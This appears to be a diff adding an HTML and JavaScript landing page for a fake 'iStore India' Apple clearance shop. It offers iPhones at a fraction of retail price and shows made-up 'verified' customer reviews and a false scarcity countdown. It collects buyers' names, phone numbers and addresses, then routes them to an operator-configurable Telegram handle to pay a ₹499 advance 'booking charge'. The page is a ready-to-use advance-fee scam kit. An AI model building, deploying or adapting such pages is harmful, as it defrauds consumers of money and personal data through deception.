@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>iStore India - Official Warehouse Clearance Store</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+    
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #090a0f;
+      color: #f5f5f7;
+    }
+
+    .glass-header {
+      background: rgba(15, 23, 42, 0.85);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-b: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .apple-trust-card {
+      background: linear-gradient(180deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.9) 100%);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
+      transition: all 0.3s ease;
+    }
+
+    .apple-trust-card:hover {
+      border-color: rgba(59, 130, 246, 0.4);
+      transform: translateY(-2px);
+    }
+
+    .glow-telegram-btn {
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
+    }
+
+    .glow-telegram-btn:hover {
+      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
+    }
+
+    .verify-badge {
+      background: linear-gradient(90deg, #059669 0%, #10b981 100%);
+    }
+  </style>
+</head>
+<body class="min-h-screen pb-20">
+
+  <!-- Security Announcement Bar -->
+  <div class="bg-gradient-to-r from-emerald-600 via-blue-600 to-indigo-600 text-white text-[11px] py-2 px-4 text-center font-bold tracking-wide flex items-center justify-center gap-2">
+    <i class="fa-solid fa-shield-check text-yellow-300 text-xs"></i>
+    <span>100% GENUINE APPLE DEVICES | FLAT ₹499 BOOKING CHARGE | CASH ON DELIVERY</span>
+  </div>
+
+  <!-- Top Navigation Header -->
+  <header class="sticky top-0 z-40 glass-header">
+    <div class="max-w-md mx-auto px-4 py-3 flex items-center justify-between">
+      <div class="flex items-center gap-2">
+        <div class="w-8 h-8 rounded-full bg-white/10 flex items-center justify-center border border-white/20">
+          <i class="fa-brands fa-apple text-lg text-white"></i>
+        </div>
+        <div>
+          <div class="flex items-center gap-1">
+            <span class="font-extrabold text-sm tracking-tight text-white">iStore Outlet</span>
+            <i class="fa-solid fa-circle-check text-blue-400 text-xs"></i>
+          </div>
+          <p class="text-[9px] text-slate-400">Direct Warehouse Clearance</p>
+        </div>
+      </div>
+      
+      <button onclick="toggleConfigModal()" class="text-xs text-slate-300 hover:text-white bg-slate-800/80 px-3 py-1.5 rounded-full transition border border-slate-700 flex items-center gap-1.5">
+        <i class="fa-solid fa-gear text-blue-400"></i>
+        <span>Settings</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <main class="max-w-md mx-auto px-4 pt-5">
+
+    <!-- Trust Hero Banner -->
+    <div class="apple-trust-card rounded-2xl p-4 mb-5 text-center relative overflow-hidden border-blue-500/20">
+      <div class="absolute top-0 right-0 bg-blue-500/10 text-blue-400 text-[9px] font-bold px-3 py-1 rounded-bl-xl uppercase tracking-wider border-l border-b border-blue-500/20">
+        Verified Seller
+      </div>
+      <h1 class="text-2xl font-black text-white mt-1 mb-1">
+        Official Stock Clearance <span class="text-blue-400">2026</span>
+      </h1>
+      <p class="text-slate-400 text-xs mb-3">Book your device now at just <strong>₹499 Booking Charge</strong> & Cash on Delivery!</p>
+      
+      <!-- Trust Points -->
+      <div class="grid grid-cols-3 gap-2 pt-3 border-t border-white/10 text-[10px]">
+        <div class="text-center">
+          <p class="font-bold text-emerald-400 text-xs">4.9 ★</p>
+          <p class="text-slate-400">Customer Rating</p>
+        </div>
+        <div class="text-center border-x border-white/10">
+          <p class="font-bold text-blue-400 text-xs">10,000+</p>
+          <p class="text-slate-400">Units Delivered</p>
+        </div>
+        <div class="text-center">
+          <p class="font-bold text-yellow-400 text-xs">₹499</p>
+          <p class="text-slate-400">Advance Booking</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live Timer Alert -->
+    <div class="bg-red-950/40 border border-red-500/30 rounded-2xl p-3.5 mb-5 flex items-center justify-between">
+      <div class="flex items-center gap-2">
+        <span class="relative flex h-3 w-3">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
+        </span>
+        <div>
+          <p class="text-xs font-bold text-red-200">Stock Offer Ending Soon!</p>
+          <p class="text-[10px] text-red-400">Only 3 units left per model</p>
+        </div>
+      </div>
+      <div class="flex gap-1 text-red-400 font-black text-sm tracking-widest bg-black/50 px-2.5 py-1 rounded-lg border border-red-500/20">
+        <span id="hours">02</span>:<span id="minutes">45</span>:<span id="seconds">18</span>
+      </div>
+    </div>
+
+    <!-- Connected Dealer Badge -->
+    <div class="apple-trust-card rounded-xl p-3 mb-5 flex items-center justify-between text-xs">
+      <div class="flex items-center gap-2.5">
+        <i class="fa-brands fa-telegram text-blue-400 text-xl"></i>
+        <div>
+          <p class="text-[10px] text-slate-400 uppercase tracking-wider">Official Telegram Support</p>
+          <p class="font-bold text-white text-xs" id="currentTelegramDisplay">@YourTelegramHandle</p>
+        </div>
+      </div>
+      <span class="verify-badge text-white text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center gap-1">
+        <i class="fa-solid fa-check text-[8px]"></i> Active
+      </span>
+    </div>
+
+    <!-- Search Box -->
+    <div class="relative mb-5">
+      <i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400 text-xs"></i>
+      <input type="text" id="searchInput" oninput="filterPhones()" placeholder="Search iPhone 12, 13, 14, 15, 16, 17..." class="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl pl-10 pr-4 py-2.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition shadow-inner" />
+    </div>
+
+    <!-- iPhone List Container -->
+    <div id="phoneGrid" class="space-y-4">
+      <!-- Cards rendered dynamically via JS -->
+    </div>
+
+    <!-- Expanded Authentic Reviews Section -->
+    <div class="mt-8 pt-6 border-t border-slate-800">
+      <h2 class="text-sm font-bold text-white mb-3 flex items-center gap-2">
+        <i class="fa-solid fa-comments text-blue-400"></i> Customer Delivery Reviews (Recent)
+      </h2>
+      <div class="space-y-3">
+        <div class="apple-trust-card p-3 rounded-xl text-xs">
+          <div class="flex justify-between items-center mb-1">
+            <span class="font-bold text-white">Rahul Sharma (Delhi) <i class="fa-solid fa-circle-check text-emerald-400 text-[10px]"></i></span>
+            <span class="text-yellow-400 text-[10px]">★★★★★</span>
+          </div>
+          <p class="text-slate-300 text-[11px]">"Bhai maine ₹499 booking charge diya tha, baki Cash on Delivery diya. iPhone 15 Pro Max exact 2 din me aa gaya. Thanks bhai!"</p>
+        </div>
+        <div class="apple-trust-card p-3 rounded-xl text-xs">
+          <div class="flex justify-between items-center mb-1">
+            <span class="font-bold text-white">Aman Verma (Mumbai) <i class="fa-solid fa-circle-check text-emerald-400 text-[10px]"></i></span>
+            <span class="text-yellow-400 text-[10px]">★★★★★</span>
+          </div>
+          <p class="text-slate-300 text-[11px]">"100% trusted hai guys! Pehle 499 pay karke order confirm kiya fir courier waale ne ghar pe box open karke check karwaya."</p>
+        </div>
+        <div class="apple-trust-card p-3 rounded-xl text-xs">
+          <div class="flex justify-between items-center mb-1">
+            <span class="font-bold text-white">Vikas Patel (Ahmedabad) <i class="fa-solid fa-circle-check text-emerald-400 text-[10px]"></i></span>
+            <span class="text-yellow-400 text-[10px]">★★★★★</span>
+          </div>
+          <p class="text-slate-300 text-[11px]">"iPhone 16 Pro Max Natural Titanium mila mujhe ₹27,999 me! Super smooth process Telegram par."</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer Trust Info -->
+    <footer class="mt-8 pt-6 border-t border-slate-800 text-center space-y-2">
+      <div class="flex justify-center gap-4 text-xs text-slate-400">
+        <span><i class="fa-solid fa-truck-fast text-blue-400 mr-1"></i> Fast Shipping</span>
+        <span><i class="fa-solid fa-box text-blue-400 mr-1"></i> Open Box Check</span>
+      </div>
+      <p class="text-[10px] text-slate-500">© 2026 iStore India. All rights reserved.</p>
+    </footer>
+
+  </main>
+
+  <!-- NEXT PAGE: CUSTOMER DETAILS & CHECKOUT MODAL -->
+  <div id="nextPageModal" class="hidden fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4 overflow-y-auto">
+    <div class="apple-trust-card bg-slate-900 rounded-2xl p-5 max-w-sm w-full border-slate-700 text-left my-auto">
+      
+      <!-- Top Header -->
+      <div class="flex justify-between items-center pb-3 border-b border-slate-800 mb-3">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-truck-ramp-box text-blue-400 text-lg"></i>
+          <h3 class="text-sm font-bold text-white">Delivery Address & Booking</h3>
+        </div>
+        <button onclick="closeNextPageModal()" class="text-slate-400 hover:text-white text-sm">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <!-- Selected Item Summary Box -->
+      <div class="bg-black/40 p-3 rounded-xl mb-4 border border-white/5 text-xs space-y-1.5">
+        <div class="flex justify-between font-bold text-white">
+          <span id="modalSelectedPhone">iPhone Model</span>
+          <span id="modalFinalPrice" class="text-blue-400">₹0</span>
+        </div>
+        <div class="text-[10px] text-slate-400 flex justify-between">
+          <span id="modalSelectedSpecs">Storage & Color</span>
+          <span class="text-emerald-400 font-semibold">Advance: ₹499 Only</span>
+        </div>
+      </div>
+
+      <!-- Customer Details Form -->
+      <form id="checkoutForm" onsubmit="submitToTelegram(event)" class="space-y-3">
+        <div>
+          <label class="block text-[11px] font-semibold text-slate-300 mb-1">Full Name *</label>
+          <input type="text" id="custName" required placeholder="Enter your name" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+        </div>
+
+        <div>
+          <label class="block text-[11px] font-semibold text-slate-300 mb-1">Mobile Number (WhatsApp/Telegram) *</label>
+          <input type="tel" id="custPhone" required placeholder="10-digit mobile number" pattern="[0-9]{10}" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+        </div>
+
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-300 mb-1">State *</label>
+            <input type="text" id="custState" required placeholder="e.g. Delhi, UP" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+          </div>
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-300 mb-1">City *</label>
+            <input type="text" id="custCity" required placeholder="Your City" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+          </div>
+        </div>
+
+        <div class="grid grid-cols-3 gap-2">
+          <div class="col-span-2">
+            <label class="block text-[11px] font-semibold text-slate-300 mb-1">Full Address / Landmark *</label>
+            <input type="text" id="custAddress" required placeholder="House No, Street, Area" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+          </div>
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-300 mb-1">Pincode *</label>
+            <input type="text" id="custPincode" required placeholder="6 digits" pattern="[0-9]{6}" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" />
+          </div>
+        </div>
+
+        <!-- Price Breakdown -->
+        <div class="bg-blue-950/30 border border-blue-500/20 p-2.5 rounded-xl text-[11px] space-y-1">
+          <div class="flex justify-between text-slate-300">
+            <span>Advance Booking Fee:</span>
+            <span class="font-bold text-yellow-400">₹499</span>
+          </div>
+          <div class="flex justify-between text-slate-300 font-bold">
+            <span>Cash on Delivery:</span>
+            <span id="modalRemainingPrice" class="text-emerald-400">₹0</span>
+          </div>
+          <p class="text-[9px] text-slate-400 italic pt-1 border-t border-white/5">
+            *Cash on Delivery amount to be paid after checking the box on delivery.
+          </p>
+        </div>
+
+        <!-- Submit Button -->
+        <button type="submit" class="glow-telegram-btn flex items-center justify-center gap-2 w-full text-white text-xs font-bold py-3 px-4 rounded-xl mt-2 transition">
+          <i class="fa-brands fa-telegram text-base"></i> CONFIRM & PROCEED TO TELEGRAM (PAY ₹499)
+        </button>
+      </form>
+      
+    </div>
+  </div>
+
+  <!-- Telegram Config Modal -->
+  <div id="configModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+    <div class="apple-trust-card bg-slate-900 rounded-2xl p-6 max-w-sm w-full border-slate-700">
+      <h3 class="text-base font-bold text-white mb-1">Set Telegram Username</h3>
+      <p class="text-xs text-slate-400 mb-4">Apna Telegram handle bina `@` ke enter karein:</p>
+      <input type="text" id="telegramHandleInput" placeholder="e.g. your_telegram_username" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-4 py-2.5 text-xs text-white mb-4 focus:outline-none focus:border-blue-500" />
+      <div class="flex gap-2">
+        <button onclick="saveTelegramHandle()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl text-xs transition">Save Handle</button>
+        <button onclick="toggleConfigModal()" class="bg-slate-800 text-slate-300 px-4 py-2.5 rounded-xl text-xs">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let telegramUsername = "YourTelegramHandle";
+
+    const phones = [
+      { id: '12', name: 'iPhone 12', basePrice: 12999, originalPrice: '₹65,900', colors: ['Black', 'White', 'Blue', 'Green', 'Purple'], img: 'https://images.unsplash.com/photo-1605236453806-6ff36851218e?auto=format&fit=crop&w=600&q=80' },
+      { id: '12pro', name: 'iPhone 12 Pro Max', basePrice: 14999, originalPrice: '₹1,19,900', colors: ['Pacific Blue', 'Gold', 'Graphite', 'Silver'], img: 'https://images.unsplash.com/photo-1603891128711-11b4b0320d56?auto=format&fit=crop&w=600&q=80' },
+      { id: '13', name: 'iPhone 13', basePrice: 14999, originalPrice: '₹69,900', colors: ['Midnight', 'Starlight', 'Blue', 'Pink', 'Green'], img: 'https://images.unsplash.com/photo-1632661674596-df8be070a5c5?auto=format&fit=crop&w=600&q=80' },
+      { id: '13pro', name: 'iPhone 13 Pro Max', basePrice: 18999, originalPrice: '₹1,29,900', colors: ['Sierra Blue', 'Graphite', 'Gold', 'Alpine Green'], img: 'https://images.unsplash.com/photo-1632661674596-df8be070a5c5?auto=format&fit=crop&w=600&q=80' },
+      { id: '14', name: 'iPhone 14', basePrice: 16999, originalPrice: '₹79,900', colors: ['Blue', 'Purple', 'Midnight', 'Starlight', 'Yellow'], img: 'https://images.unsplash.com/photo-1663499482523-1c0c1bae4ce1?auto=format&fit=crop&w=600&q=80' },
+      { id: '14pro', name: 'iPhone 14 Pro Max', basePrice: 20999, originalPrice: '₹1,39,900', colors: ['Deep Purple', 'Space Black', 'Gold', 'Silver'], img: 'https://images.unsplash.com/photo-1663499482523-1c0c1bae4ce1?auto=format&fit=crop&w=600&q=80' },
+      { id: '15', name: 'iPhone 15', basePrice: 19999, originalPrice: '₹79,900', colors: ['Pink', 'Yellow', 'Green', 'Blue', 'Black'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '15pro', name: 'iPhone 15 Pro Max', basePrice: 24999, originalPrice: '₹1,59,900', colors: ['Natural Titanium', 'Blue Titanium', 'White Titanium', 'Black Titanium'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '16', name: 'iPhone 16', basePrice: 22999, originalPrice: '₹79,900', colors: ['Ultramarine', 'Teal', 'Pink', 'White', 'Black'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '16pro', name: 'iPhone 16 Pro Max', basePrice: 27999, originalPrice: '₹1,79,900', colors: ['Desert Titanium', 'Natural Titanium', 'White Titanium', 'Black Titanium'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '17', name: 'iPhone 17', basePrice: 26999, originalPrice: '₹89,900', colors: ['Ultramarine', 'Teal', 'Pink', 'White', 'Black'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '17pro', name: 'iPhone 17 Pro', basePrice: 32999, originalPrice: '₹1,49,900', colors: ['Natural Titanium', 'Desert Titanium', 'White Titanium', 'Black Titanium'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' },
+      { id: '17promax', name: 'iPhone 17 Pro Max', basePrice: 34999, originalPrice: '₹1,89,900', colors: ['Desert Titanium', 'Natural Titanium', 'White Titanium', 'Black Titanium'], img: 'https://images.unsplash.com/photo-1695048133142-1a20484d2569?auto=format&fit=crop&w=600&q=80' }
+    ];
+
+    const userSelections = {};
+    let activePhoneOrder = null;
+
+    function initSelections() {
+      phones.forEach(p => {
+        userSelections[p.id] = {
+          storageAddOn: 0,
+          storageLabel: '128 GB',
+          color: p.colors[0]
+        };
+      });
+    }
+
+    function renderCards(data) {
+      const grid = document.getElementById('phoneGrid');
+      grid.innerHTML = '';
+      
+      data.forEach(phone => {
+        const selection = userSelections[phone.id];
+        const finalPriceNumber = phone.basePrice + selection.storageAddOn;
+        const formattedPrice = '₹' + finalPriceNumber.toLocaleString('en-IN');
+
+        const card = document.createElement('div');
+        card.className = "apple-trust-card rounded-2xl p-4 relative overflow-hidden";
+        card.innerHTML = `
+          <div class="flex items-center justify-between mb-3">
+            <span class="bg-emerald-500/10 text-emerald-400 text-[10px] font-bold px-2.5 py-0.5 rounded-full border border-emerald-500/20 flex items-center gap-1">
+              <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Stock Ready
+            </span>
+            <span class="bg-yellow-500/10 text-yellow-400 text-[10px] font-bold px-2 py-0.5 rounded border border-yellow-500/20">
+              ₹499 BOOKING CHARGE
+            </span>
+          </div>
+
+          <div class="flex items-start gap-4 mb-3">
+            <div class="w-24 h-28 bg-black/50 rounded-xl flex items-center justify-center p-2 border border-white/10 flex-shrink-0">
+              <img src="${phone.img}" alt="${phone.name}" class="h-full object-contain" />
+            </div>
+            <div class="flex-1 min-w-0">
+              <h3 class="text-base font-extrabold text-white leading-tight truncate mb-1">${phone.name}</h3>
+              <p class="text-[10px] text-slate-400 mb-2">Sealed Box + 1 Year Warranty</p>
+              <div class="flex items-baseline gap-2">
+                <span class="text-2xl font-black text-blue-400">${formattedPrice}</span>
+                <span class="text-xs text-slate-500 line-through">${phone.originalPrice}</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="bg-black/40 p-3 rounded-xl space-y-2.5 mb-3 border border-white/5">
+            <div>
+              <div class="flex justify-between text-[10px] text-slate-400 mb-1">
+                <span class="font-bold">STORAGE:</span>
+                <span class="text-blue-400 font-semibold">${selection.storageLabel}</span>
+              </div>
+              <div class="grid grid-cols-3 gap-1.5">
+                <button onclick="updateStorage('${phone.id}', 0, '128 GB')" class="py-1.5 text-[11px] font-bold rounded-lg border transition ${selection.storageAddOn === 0 ? 'bg-blue-600 border-blue-500 text-white' : 'bg-slate-800/80 border-slate-700 text-slate-300 hover:bg-slate-700'}">
+                  128GB
+                </button>
+                <button onclick="updateStorage('${phone.id}', 3000, '256 GB')" class="py-1.5 text-[11px] font-bold rounded-lg border transition ${selection.storageAddOn === 3000 ? 'bg-blue-600 border-blue-500 text-white' : 'bg-slate-800/80 border-slate-700 text-slate-300 hover:bg-slate-700'}">
+                  256GB <span class="text-[9px] opacity-80">+3k</span>
+                </button>
+                <button onclick="updateStorage('${phone.id}', 6000, '512 GB')" class="py-1.5 text-[11px] font-bold rounded-lg border transition ${selection.storageAddOn === 6000 ? 'bg-blue-600 border-blue-500 text-white' : 'bg-slate-800/80 border-slate-700 text-slate-300 hover:bg-slate-700'}">
+                  512GB <span class="text-[9px] opacity-80">+6k</span>
+                </button>
+              </div>
+            </div>
+
+            <div>
+              <div class="flex justify-between text-[10px] text-slate-400 mb-1">
+                <span class="font-bold">COLOUR:</span>
+                <span class="text-blue-400 font-semibold">${selection.color}</span>
+              </div>
+              <select onchange="updateColor('${phone.id}', this.value)" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-blue-500">
+                ${phone.colors.map(c => `<option value="${c}" ${selection.color === c ? 'selected' : ''}>${c}</option>`).join('')}
+              </select>
+            </div>
+          </div>
+
+          <button onclick="openNextPageModal('${phone.id}', '${phone.name}', ${finalPriceNumber})" class="glow-telegram-btn flex items-center justify-center gap-2 w-full text-white text-xs font-bold py-3 px-4 rounded-xl transition duration-200">
+            <i class="fa-brands fa-telegram text-base"></i> BOOK NOW ON TELEGRAM AT ₹499
+          </button>
+        `;
+        grid.appendChild(card);
+      });
+    }
+
+    function openNextPageModal(id, phoneName, finalPrice) {
+      const selection = userSelections[id];
+      activePhoneOrder = {
+        name: phoneName,
+        storage: selection.storageLabel,
+        color: selection.color,
+        finalPrice: finalPrice
+      };
+
+      document.getElementById('modalSelectedPhone').innerText = phoneName;
+      document.getElementById('modalSelectedSpecs').innerText = `${selection.storageLabel} | ${selection.color}`;
+      
+      const formattedPrice = '₹' + finalPrice.toLocaleString('en-IN');
+      const codPrice = '₹' + (finalPrice - 499).toLocaleString('en-IN');
+      
+      document.getElementById('modalFinalPrice').innerText = formattedPrice;
+      document.getElementById('modalRemainingPrice').innerText = codPrice;
+
+      document.getElementById('nextPageModal').classList.remove('hidden');
+    }
+
+    function closeNextPageModal() {
+      document.getElementById('nextPageModal').classList.add('hidden');
+    }
+
+    function submitToTelegram(event) {
+      event.preventDefault();
+
+      const name = document.getElementById('custName').value.trim();
+      const phone = document.getElementById('custPhone').value.trim();
+      const state = document.getElementById('custState').value.trim();
+      const city = document.getElementById('custCity').value.trim();
+      const address = document.getElementById('custAddress').value.trim();
+      const pincode = document.getElementById('custPincode').value.trim();
+
+      const formattedPrice = '₹' + activePhoneOrder.finalPrice.toLocaleString('en-IN');
+      const codPrice = '₹' + (activePhoneOrder.finalPrice - 499).toLocaleString('en-IN');
+
+      const fullMessage = `🛒 NEW ORDER BOOKING REQUEST\n\n` +
+        `📱 Model: ${activePhoneOrder.name}\n` +
+        `💾 Storage: ${activePhoneOrder.storage}\n` +
+        `🎨 Colour: ${activePhoneOrder.color}\n` +
+        `💰 Deal Price: ${formattedPrice}\n` +
+        `🟡 Booking Fee: ₹499\n` +
+        `💵 Cash on Delivery: ${codPrice}\n\n` +
+        `📋 CUSTOMER DELIVERY DETAILS:\n` +
+        `-------------------------------\n` +
+        `👤 Name: ${name}\n` +
+        `📞 Phone: ${phone}\n` +
+        `📍 Address: ${address}\n` +
+        `🏙️ City: ${city}\n` +
+        `🗺️ State: ${state}\n` +
+        `📮 Pincode: ${pincode}\n\n` +
+        `Please send QR / Payment link to pay ₹499 booking charge.`;
+
+      const telegramUrl = `https://t.me/${telegramUsername}?text=${encodeURIComponent(fullMessage)}`;
+      window.open(telegramUrl, '_blank');
+    }
+
+    function updateStorage(id, addOn, label) {
+      userSelections[id].storageAddOn = addOn;
+      userSelections[id].storageLabel = label;
+      filterPhones();
+    }
+
+    function updateColor(id, color) {
+      userSelections[id].color = color;
+      filterPhones();
+    }
+
+    function filterPhones() {
+      const query = document.getElementById('searchInput').value.toLowerCase();
+      const filtered = phones.filter(p => p.name.toLowerCase().includes(query));
+      renderCards(filtered);
+    }
+
+    function toggleConfigModal() {
+      document.getElementById('configModal').classList.toggle('hidden');
+    }
+
+    function saveTelegramHandle() {
+      const handle = document.getElementById('telegramHandleInput').value.trim().replace('@', '');
+      if (handle) {
+        telegramUsername = handle;
+        document.getElementById('currentTelegramDisplay').innerText = '@' + handle;
+        filterPhones();
+        toggleConfigModal();
+      }
+    }
+
+    let totalSeconds = 10000;
+    setInterval(() => {
+      if (totalSeconds > 0) {
+        totalSeconds--;
+        const hrs = Math.floor(totalSeconds / 3600);
+        const mins = Math.floor((totalSeconds % 3600) / 60);
+        const secs = totalSeconds % 60;
+        document.getElementById('hours').innerText = String(hrs).padStart(2, '0');
+        document.getElementById('minutes').innerText = String(mins).padStart(2, '0');
+        document.getElementById('seconds').innerText = String(secs).padStart(2, '0');
+      }
+    }, 1000);
+
+    initSelections();
+    renderCards(phones);
+  </script>
+</body>
+</html>
